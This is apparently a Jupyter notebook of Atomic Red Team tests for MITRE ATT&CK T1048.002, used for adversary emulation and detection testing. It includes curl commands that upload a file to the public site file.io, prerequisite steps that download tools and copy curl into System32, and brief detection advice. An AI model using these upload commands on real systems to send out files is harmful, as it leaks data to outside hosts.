{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "8c38d3d4",
   "metadata": {},
   "source": "# T1048.002 - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol\nAdversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. \n\nAsymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin. \n\nNetwork protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol. "
  },
  {
   "cell_type": "markdown",
   "id": "b86d9206",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "137ffd69",
   "metadata": {},
   "source": "### Atomic Test #1 - Exfiltrate data HTTPS using curl windows\nExfiltrate data HTTPS using curl to file share site file.io\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Curl must be installed on system.\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path C:\\Windows\\System32\\Curl.exe) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://curl.se/windows/dl-8.4.0_6/curl-8.4.0_6-win64-mingw.zip\" -Outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\"\nExpand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl.zip\" -DestinationPath \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\"\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\curl\\curl-8.4.0_6-win64-mingw\\bin\\curl.exe\" C:\\Windows\\System32\\Curl.exe\n\n```\n##### Description: #{input_file} must be exist on system.\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder/T1048.002/src/artifact\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder/T1048.002/src/artifact\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1048.002/src/artifact\" -OutFile \"PathToAtomicsFolder/T1048.002/src/artifact\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5bc5b032",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1048.002 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "333653be",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nC:\\Windows\\System32\\Curl.exe -k -F \"file=@PathToAtomicsFolder/T1048.002/src/artifact\" https://file.io/\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7602a334",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1048.002 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "a34c16e7",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Exfiltrate data HTTPS using curl freebsd,linux or macos",
    "Exfiltrate data HTTPS using curl to file share site file.io\n",
    "**Supported Platforms:** macos, linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\ncurl -F 'file=@PathToAtomicsFolder/T1048.002/src/artifact' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "295071d7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1048.002 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "45c1528e",
   "metadata": {},
   "source": "## Detection\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.(Citation: University of Birmingham C2) "
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}